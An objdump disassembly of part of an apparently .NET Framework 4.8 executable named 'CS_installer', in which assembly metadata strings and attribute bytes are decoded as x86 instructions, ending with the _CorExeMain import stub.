  403168:	20 03                	and    %al,(%ebx)
  40316a:	01 0e                	add    %ecx,(%esi)
  40316c:	0e                   	push   %cs
  40316d:	0e                   	push   %cs
  40316e:	05 0a 01 12 80       	add    $0x8012010a,%eax
  403173:	a1 05 20 00 12       	mov    0x12002005,%eax
  403178:	80 a5 07 20 02 12 55 	andb   $0x55,0x12022007(%ebp)
  40317f:	0e                   	push   %cs
  403180:	12 4d 08             	adc    0x8(%ebp),%cl
  403183:	b7 7a                	mov    $0x7a,%bh
  403185:	5c                   	pop    %esp
  403186:	56                   	push   %esi
  403187:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40318a:	89 08                	mov    %ecx,(%eax)
  40318c:	e2 56                	loop   0x4031e4
  40318e:	03 a8 8b 3a a7 da    	add    -0x2558c575(%eax),%ebp
  403194:	03 06                	add    (%esi),%eax
  403196:	1d 05 02 06 05       	sbb    $0x5060205,%eax
  40319b:	04 20                	add    $0x20,%al
  40319d:	01 01                	add    %eax,(%ecx)
  40319f:	05 05 20 01 01       	add    $0x1012005,%eax
  4031a4:	1d 05 07 00 04       	sbb    $0x4000705,%eax
  4031a9:	08 18                	or     %bl,(%eax)
  4031ab:	0e                   	push   %cs
  4031ac:	0e                   	push   %cs
  4031ad:	08 03                	or     %al,(%ebx)
  4031af:	00 00                	add    %al,(%eax)
  4031b1:	0e                   	push   %cs
  4031b2:	05 00 01 01 1d       	add    $0x1d010100,%eax
  4031b7:	0e                   	push   %cs
  4031b8:	08 01                	or     %al,(%ecx)
  4031ba:	00 08                	add    %cl,(%eax)
  4031bc:	00 00                	add    %al,(%eax)
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	00 1e                	add    %bl,(%esi)
  4031c2:	01 00                	add    %eax,(%eax)
  4031c4:	01 00                	add    %eax,(%eax)
  4031c6:	54                   	push   %esp
  4031c7:	02 16                	add    (%esi),%dl
  4031c9:	57                   	push   %edi
  4031ca:	72 61                	jb     0x40322d
  4031cc:	70 4e                	jo     0x40321c
  4031ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4031cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4031d0:	45                   	inc    %ebp
  4031d1:	78 63                	js     0x403236
  4031d3:	65 70 74             	gs jo  0x40324a
  4031d6:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4031dd:	77 73                	ja     0x403252
  4031df:	01 08                	add    %ecx,(%eax)
  4031e1:	01 00                	add    %eax,(%eax)
  4031e3:	02 00                	add    (%eax),%al
  4031e5:	00 00                	add    %al,(%eax)
  4031e7:	00 00                	add    %al,(%eax)
  4031e9:	49                   	dec    %ecx
  4031ea:	01 00                	add    %eax,(%eax)
  4031ec:	1a 2e                	sbb    (%esi),%ch
  4031ee:	4e                   	dec    %esi
  4031ef:	45                   	inc    %ebp
  4031f0:	54                   	push   %esp
  4031f1:	46                   	inc    %esi
  4031f2:	72 61                	jb     0x403255
  4031f4:	6d                   	insl   (%dx),%es:(%edi)
  4031f5:	65 77 6f             	gs ja  0x403267
  4031f8:	72 6b                	jb     0x403265
  4031fa:	2c 56                	sub    $0x56,%al
  4031fc:	65 72 73             	gs jb  0x403272
  4031ff:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  403206:	38 01                	cmp    %al,(%ecx)
  403208:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40320c:	46                   	inc    %esi
  40320d:	72 61                	jb     0x403270
  40320f:	6d                   	insl   (%dx),%es:(%edi)
  403210:	65 77 6f             	gs ja  0x403282
  403213:	72 6b                	jb     0x403280
  403215:	44                   	inc    %esp
  403216:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40321d:	61                   	popa
  40321e:	6d                   	insl   (%dx),%es:(%edi)
  40321f:	65 12 2e             	adc    %gs:(%esi),%ch
  403222:	4e                   	dec    %esi
  403223:	45                   	inc    %ebp
  403224:	54                   	push   %esp
  403225:	20 46 72             	and    %al,0x72(%esi)
  403228:	61                   	popa
  403229:	6d                   	insl   (%dx),%es:(%edi)
  40322a:	65 77 6f             	gs ja  0x40329c
  40322d:	72 6b                	jb     0x40329a
  40322f:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  403232:	38 11                	cmp    %dl,(%ecx)
  403234:	01 00                	add    %eax,(%eax)
  403236:	0c 43                	or     $0x43,%al
  403238:	53                   	push   %ebx
  403239:	5f                   	pop    %edi
  40323a:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  403241:	65 72 00             	gs jb  0x403244
  403244:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  403247:	00 07                	add    %al,(%edi)
  403249:	52                   	push   %edx
  40324a:	65 6c                	gs insb (%dx),%es:(%edi)
  40324c:	65 61                	gs popa
  40324e:	73 65                	jae    0x4032b5
  403250:	00 00                	add    %al,(%eax)
  403252:	0c 01                	or     $0x1,%al
  403254:	00 07                	add    %al,(%edi)
  403256:	31 2e                	xor    %ebp,(%esi)
  403258:	30 2e                	xor    %ch,(%esi)
  40325a:	30 2e                	xor    %ch,(%esi)
  40325c:	30 00                	xor    %al,(%eax)
  40325e:	00 0a                	add    %cl,(%edx)
  403260:	01 00                	add    %eax,(%eax)
  403262:	05 31 2e 30 2e       	add    $0x2e302e31,%eax
  403267:	30 00                	xor    %al,(%eax)
  403269:	00 04 01             	add    %al,(%ecx,%eax,1)
  40326c:	00 00                	add    %al,(%eax)
  40326e:	00 26                	add    %ah,(%esi)
  403270:	01 00                	add    %eax,(%eax)
  403272:	84 6b 00             	test   %ch,0x0(%ebx)
  403275:	00 02                	add    %al,(%edx)
  403277:	00 54 02 0d          	add    %dl,0xd(%edx,%eax,1)
  40327b:	41                   	inc    %ecx
  40327c:	6c                   	insb   (%dx),%es:(%edi)
  40327d:	6c                   	insb   (%dx),%es:(%edi)
  40327e:	6f                   	outsl  %ds:(%esi),(%dx)
  40327f:	77 4d                	ja     0x4032ce
  403281:	75 6c                	jne    0x4032ef
  403283:	74 69                	je     0x4032ee
  403285:	70 6c                	jo     0x4032f3
  403287:	65 00 54 02 09       	add    %dl,%gs:0x9(%edx,%eax,1)
  40328c:	49                   	dec    %ecx
  40328d:	6e                   	outsb  %ds:(%esi),(%dx)
  40328e:	68 65 72 69 74       	push   $0x74697265
  403293:	65 64 00 26          	gs add %ah,%fs:(%esi)
  403297:	01 00                	add    %eax,(%eax)
  403299:	4c                   	dec    %esp
  40329a:	14 00                	adc    $0x0,%al
  40329c:	00 02                	add    %al,(%edx)
  40329e:	00 54 02 0d          	add    %dl,0xd(%edx,%eax,1)
  4032a2:	41                   	inc    %ecx
  4032a3:	6c                   	insb   (%dx),%es:(%edi)
  4032a4:	6c                   	insb   (%dx),%es:(%edi)
  4032a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032a6:	77 4d                	ja     0x4032f5
  4032a8:	75 6c                	jne    0x403316
  4032aa:	74 69                	je     0x403315
  4032ac:	70 6c                	jo     0x40331a
  4032ae:	65 00 54 02 09       	add    %dl,%gs:0x9(%edx,%eax,1)
  4032b3:	49                   	dec    %ecx
  4032b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4032b5:	68 65 72 69 74       	push   $0x74697265
  4032ba:	65 64 00 05 01 00 01 	gs add %al,%fs:0x10001
  4032c1:	00 
  4032c2:	00 05 01 00 00 00    	add    %al,0x1
	...
  4032d8:	10 00                	adc    %al,(%eax)
	...
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	10 33                	adc    %dh,(%ebx)
	...
  4032f2:	00 00                	add    %al,(%eax)
  4032f4:	2a 33                	sub    (%ebx),%dh
  4032f6:	00 00                	add    %al,(%eax)
  4032f8:	00 20                	add    %ah,(%eax)
	...
  40330e:	00 00                	add    %al,(%eax)
  403310:	1c 33                	sbb    $0x33,%al
	...
  40331e:	5f                   	pop    %edi
  40331f:	43                   	inc    %ebx
  403320:	6f                   	outsl  %ds:(%esi),(%dx)
  403321:	72 45                	jb     0x403368
  403323:	78 65                	js     0x40338a
  403325:	4d                   	dec    %ebp
  403326:	61                   	popa
  403327:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40332e:	72 65                	jb     0x403395
  403330:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  403334:	6c                   	insb   (%dx),%es:(%edi)
  403335:	00 00                	add    %al,(%eax)
  403337:	00 00                	add    %al,(%eax)
  403339:	00 ff                	add    %bh,%bh
  40333b:	25 00 20 40 00       	and    $0x402000,%eax
